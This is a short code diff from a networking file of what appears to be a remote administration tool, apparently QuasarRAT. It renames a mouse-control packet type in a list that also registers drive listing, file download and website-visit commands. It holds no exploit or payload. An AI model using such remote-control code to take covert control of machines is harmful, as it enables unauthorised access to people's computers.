@@ -135,7 +135,7 @@ namespace xServer.Core.Networking
                 typeof (Packets.ServerPackets.GetDrives),
                 typeof (Packets.ServerPackets.GetDirectory),
                 typeof (Packets.ServerPackets.DoDownloadFile),
-                typeof (Packets.ServerPackets.DoMouseClick),
+                typeof (Packets.ServerPackets.DoMouseEvent),
                 typeof (Packets.ServerPackets.GetSystemInfo),
                 typeof (Packets.ServerPackets.DoVisitWebsite),
                 typeof (Packets.ServerPackets.DoShowMessageBox),
